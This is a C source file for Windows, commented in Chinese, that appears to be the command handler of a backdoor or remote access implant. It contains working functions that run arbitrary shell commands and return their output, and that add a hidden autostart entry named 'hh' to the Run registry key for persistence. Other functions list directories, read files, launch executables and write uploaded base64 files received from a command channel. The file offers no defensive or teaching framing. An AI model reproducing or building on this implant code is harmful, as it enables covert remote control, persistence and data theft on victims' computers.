#include"header.h"




char* ExecuteCommand(const char* cmd) {
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) return _strdup("[!] fail to execute");

    char buffer[4096];
    size_t total = 0;
    char* output = (char*)malloc(1);

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        size_t len = strlen(buffer);
        output = (char*)realloc(output, total + len + 1);
        memcpy(output + total, buffer, len);
        total += len;
        output[total] = '\0';
    }

    _pclose(pipe);
    return output;
}


void set_startup(const char* program_path, int enable) {
    HKEY hKey;
    const char* value_name = "hh";
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        if (enable) {
            RegSetValueExA(hKey, value_name, 0, REG_SZ, (const BYTE*)program_path, strlen(program_path) + 1);
        }
        else {
            RegDeleteValueA(hKey, value_name);
        }
        RegCloseKey(hKey);
    }
}

char* list_directory(const char* path) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    // 支持中文路径（转换为宽字符）
    int wPathLen = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
    wchar_t* wPath = (wchar_t*)malloc((wPathLen + 3) * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, wPathLen);
    wcscat(wPath, L"\\*");

    // 初始化输出缓冲区
    size_t outputSize = 4096;
    char* output = (char*)malloc(outputSize);
    if (!output) {
        free(wPath);
        return _strdup("[!] Memory allocation failed");
    }
    output[0] = '\0';

    // 开始查找文件
    hFind = FindFirstFileW(wPath, &findFileData);
    free(wPath);

    if (hFind == INVALID_HANDLE_VALUE) {
        snprintf(output, outputSize, "[!] No files found in %s", path);
        return output;
    }

    do {
        // 跳过 "." 和 ".."
        if (wcscmp(findFileData.cFileName, L".") == 0 ||
            wcscmp(findFileData.cFileName, L"..") == 0) {
            continue;
        }

        // 转换文件名回 ANSI/UTF-8
        char fileName[512];
        WideCharToMultiByte(CP_UTF8, 0, findFileData.cFileName, -1, fileName, sizeof(fileName), NULL, NULL);

        // 判断是文件还是目录
        const char* type = (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "<DIR>" : "     ";

        // 格式化输出
        char line[1024];
        snprintf(line, sizeof(line), "%-8s %-12s\n", fileName, type);

        // 检查是否需要扩容
        if (strlen(output) + strlen(line) >= outputSize) {
            outputSize *= 2;
            output = (char*)realloc(output, outputSize);
        }

        strcat(output, line);

    } while (FindNextFile(hFind, &findFileData));

    FindClose(hFind);
    return output;
}

// 执行指定路径的 exe 文件
int run_executable(const char* path, int mode) {
    HINSTANCE result = ShellExecuteA(NULL, "open", path, NULL, NULL, mode);
    return (intptr_t)result > 32 ? 0 : -1;
}

// 获取当前工作目录
char* pwd_command() {
    char buffer[DEFAULT_BUFLEN];
    if (_getcwd(buffer, sizeof(buffer)) == NULL) {
        return _strdup("[!] Failed to get current working directory");
    }
    else {
        return _strdup(buffer);
    }
}

// 切换当前工作目录
char* cd_command(const char* path) {
    if (_chdir(path) != 0) {
        char* error = (char*)malloc(256);
        snprintf(error, 256, "[!] Failed to change directory to %s", path);
        return error;
    }
    return pwd_command(); // 返回新路径
}

char* cat_file(const char* path) {
    FILE* fp = fopen(path, "r");
    if (!fp) {
        char* error = (char*)malloc(256);
        snprintf(error, 256, "[!] Failed to open file: %s", path);
        return error;
    }

    size_t totalSize = 0;
    size_t bufferSize = 4096;
    char* buffer = (char*)malloc(bufferSize);
    buffer[0] = '\0';

    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        // 替换非法字符
        for (int i = 0; line[i]; i++) {
            if (line[i] == '\r' || line[i] == '\n') line[i] = ' ';
        }

        size_t len = strlen(buffer) + strlen(line) + 2;
        if (len > bufferSize) {
            bufferSize *= 2;
            buffer = (char*)realloc(buffer, bufferSize);
        }
        strcat(buffer, line);
        strcat(buffer, "\n");
    }

    fclose(fp);
    return buffer;
}

BYTE* base64_decode(const char* input, DWORD in_len, DWORD* out_len) {
    DWORD decoded_len = 0;
    if (!CryptStringToBinaryA(input, in_len, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL)) {
        printf("[!] Failed to calculate decoded length\n");
        return NULL;
    }

    BYTE* output = (BYTE*)malloc(decoded_len + 1);
    if (!output) {
        printf("[!] Memory allocation failed\n");
        return NULL;
    }

    if (CryptStringToBinaryA(input, in_len, CRYPT_STRING_BASE64, output, &decoded_len, NULL, NULL)) {
        *out_len = decoded_len;
        output[decoded_len] = '\0';  // 可选：空终止符
        return output;
    }

    free(output);
    return NULL;
}

typedef struct {
    char filename[MAX_PATH];    // 文件名
    long size;                 // 文件大小
    FILE* fp;                   // 文件指针
    char* b64_content;        // Base64 缓存
    long b64_len;              // 当前 Base64 长度
    long b64_capacity;         // Base64 缓存容量
    char expected_hash[65];   // 存储期望的 SHA256 值
} ReceivedFile;

extern ReceivedFile current_file;

ReceivedFile current_file = { 0 };

int handle_file_upload(ParsedCommand cmd) {
    for (int i = 0; i < cmd.num_params; ++i) {
        char* line = cmd.params[i];

        if (strcmp(line, "UPLOADSTART") == 0) {
            // 重置上传状态
            if (current_file.b64_content) {
                free(current_file.b64_content);
            }
            memset(&current_file, 0, sizeof(ReceivedFile));
            printf("[+] Upload started\n");
        }

        else if (strncmp(line, "FILENAME:", 9) == 0) {
            strncpy(current_file.filename, line + 9, MAX_PATH - 1);
            current_file.filename[MAX_PATH - 1] = '\0';
            printf("[+] Receiving file: %s\n", current_file.filename);
        }

        else if (strncmp(line, "SIZE:", 5) == 0) {
            current_file.size = atol(line + 5);
            current_file.b64_capacity = current_file.size * 2;

            if (current_file.b64_content) {
                free(current_file.b64_content);
            }
            current_file.b64_content = (char*)malloc(current_file.b64_capacity + 1);
            if (!current_file.b64_content) {
                printf("[!] Memory allocation failed\n");
                return -1;
            }
            current_file.b64_len = 0;
        }

        else if (strncmp(line, "DATA:", 5) == 0) {
            const char* data = line + 5;
            int data_len = strlen(data);

            if (current_file.b64_len + data_len + 1 >= current_file.b64_capacity) {
                current_file.b64_capacity += 1024;
                char* new_buf = (char*)realloc(current_file.b64_content, current_file.b64_capacity + 1);
                if (!new_buf) {
                    printf("[!] Memory reallocation failed\n");
                    return -1;
                }
                current_file.b64_content = new_buf;
            }

            memcpy(current_file.b64_content + current_file.b64_len, data, data_len);
            current_file.b64_len += data_len;
        }

        else if (strncmp(line, "HASH:", 5) == 0) {
            strncpy(current_file.expected_hash, line + 5, 64);
            current_file.expected_hash[64] = '\0';
            printf("[+] Expected SHA256: %s\n", current_file.expected_hash);
        }

        else if (strcmp(line, "UPLOADEND") == 0) {
            if (!current_file.b64_content || current_file.b64_len == 0) {
                printf("[!] No data received\n");
                return -1;
            }

            // 解码 Base64
            DWORD decoded_len = 0;
            BYTE* decoded = base64_decode(current_file.b64_content, current_file.b64_len, &decoded_len);
            if (decoded && decoded_len > 0) {
                // 计算 SHA256
                char actual_hash[65];
                if (compute_sha256(decoded, decoded_len, actual_hash) != 0) {
                    printf("[-] SHA256 calculation failed\n");
                    free(decoded);
                    return -1;
                }

                // 校验
                if (strlen(current_file.expected_hash) == 64 &&
                    memcmp(current_file.expected_hash, actual_hash, 64) == 0) {
                    printf("[+] SHA256 verified: %s\n", actual_hash);

                    // 保存文件
                    current_file.fp = fopen(current_file.filename, "wb");
                    if (current_file.fp) {
                        fwrite(decoded, 1, decoded_len, current_file.fp);
                        fclose(current_file.fp);
                        printf("[+] File saved: %s (%ld bytes)\n", current_file.filename, decoded_len);
                    }
                    else {
                        printf("[!] Failed to open file: %s\n", current_file.filename);
                    }
                }
                else {
                    printf("[-] SHA256 verification failed!\n");
                    printf("[-] Expected: %s\n", current_file.expected_hash);
                    printf("[-] Actual:   %s\n", actual_hash);
                }
            }
            else {
                printf("[!] Base64 decode failed\n");
            }

            // 清理资源
            free(current_file.b64_content);
            free(decoded);
            current_file.b64_content = NULL;
            current_file.b64_len = 0;
            current_file.size = 0;
            current_file.fp = NULL;
        }
    }

    return 0;
}